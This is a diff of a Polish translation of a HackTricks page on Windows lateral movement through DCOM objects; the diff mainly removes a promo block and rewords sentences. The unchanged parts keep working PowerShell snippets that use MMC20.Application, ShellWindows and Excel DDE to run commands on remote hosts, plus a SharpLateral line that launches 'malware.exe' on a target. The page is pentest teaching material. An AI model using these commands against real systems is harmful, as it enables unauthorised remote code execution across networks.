@@ -15,19 +15,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## MMC20.Application
 
 **Aby uzyskać więcej informacji na temat tej techniki, sprawdź oryginalny post z [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
-Distributed Component Object Model (DCOM) obiekty oferują interesującą możliwość interakcji w sieci z obiektami. Microsoft zapewnia szczegółową dokumentację zarówno dla DCOM, jak i Component Object Model (COM), dostępną [tutaj dla DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) oraz [tutaj dla COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Lista aplikacji DCOM może być pobrana za pomocą polecenia PowerShell:
+Obiekty Distributed Component Object Model (DCOM) oferują interesującą możliwość interakcji z obiektami w sieci. Microsoft zapewnia szczegółową dokumentację zarówno dla DCOM, jak i Component Object Model (COM), dostępną [tutaj dla DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) oraz [tutaj dla COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Lista aplikacji DCOM może być pobrana za pomocą polecenia PowerShell:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
@@ -37,9 +29,9 @@ Funkcja ta ułatwia wykonywanie poleceń w sieci za pośrednictwem aplikacji DCO
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
-To polecenie łączy się z aplikacją DCOM i zwraca instancję obiektu COM. Metoda ExecuteShellCommand może być następnie wywołana, aby uruchomić proces na zdalnym hoście. Proces obejmuje następujące kroki:
+To polecenie łączy się z aplikacją DCOM i zwraca instancję obiektu COM. Metoda ExecuteShellCommand może być następnie wywołana w celu uruchomienia procesu na zdalnym hoście. Proces obejmuje następujące kroki:
 
-Sprawdź metody:
+Check methods:
 ```powershell
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
 $com.Document.ActiveView | Get-Member
@@ -57,12 +49,12 @@ ls \\10.10.10.10\c$\Users
 
 **Aby uzyskać więcej informacji na temat tej techniki, sprawdź oryginalny post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-Obiekt **MMC20.Application** został zidentyfikowany jako brakujący w wyraźnych "LaunchPermissions", domyślnie przyznając uprawnienia, które pozwalają Administratorom na dostęp. Aby uzyskać dalsze szczegóły, można zbadać wątek [tutaj](https://twitter.com/tiraniddo/status/817532039771525120), a użycie [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET do filtrowania obiektów bez wyraźnych uprawnień uruchomienia jest zalecane.
+Obiekt **MMC20.Application** został zidentyfikowany jako brakujący w "LaunchPermissions", domyślnie przyznając uprawnienia, które pozwalają Administratorom na dostęp. Aby uzyskać dalsze szczegóły, można zbadać wątek [tutaj](https://twitter.com/tiraniddo/status/817532039771525120), a użycie [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET do filtrowania obiektów bez wyraźnych uprawnień uruchomienia jest zalecane.
 
 Dwa konkretne obiekty, `ShellBrowserWindow` i `ShellWindows`, zostały wyróżnione z powodu braku wyraźnych uprawnień uruchomienia. Brak wpisu rejestru `LaunchPermission` pod `HKCR:\AppID\{guid}` oznacza brak wyraźnych uprawnień.
 
 ###  ShellWindows
-Dla `ShellWindows`, który nie ma ProgID, metody .NET `Type.GetTypeFromCLSID` i `Activator.CreateInstance` ułatwiają instancjonowanie obiektu przy użyciu jego AppID. Proces ten wykorzystuje OleView .NET do pobrania CLSID dla `ShellWindows`. Po instancjonowaniu możliwa jest interakcja za pomocą metody `WindowsShell.Item`, co prowadzi do wywołania metod, takich jak `Document.Application.ShellExecute`.
+Dla `ShellWindows`, który nie ma ProgID, metody .NET `Type.GetTypeFromCLSID` i `Activator.CreateInstance` ułatwiają instancjonowanie obiektu przy użyciu jego AppID. Proces ten wykorzystuje OleView .NET do pobrania CLSID dla `ShellWindows`. Po zainstancjonowaniu możliwa jest interakcja za pomocą metody `WindowsShell.Item`, co prowadzi do wywołania metod, takich jak `Document.Application.ShellExecute`.
 
 Podano przykładowe polecenia PowerShell do instancjonowania obiektu i zdalnego wykonywania poleceń:
 ```powershell
@@ -98,7 +90,7 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-### Narzędzia automatyzacji do ruchu bocznego
+### Narzędzia Automatyzacji dla Ruchu Lateralnego
 
 Dwa narzędzia są wyróżnione do automatyzacji tych technik:
 
@@ -120,12 +112,6 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 * [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
 * [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
 Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
 Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
@@ -135,7 +121,7 @@ Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-
 <summary>Wsparcie dla HackTricks</summary>
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
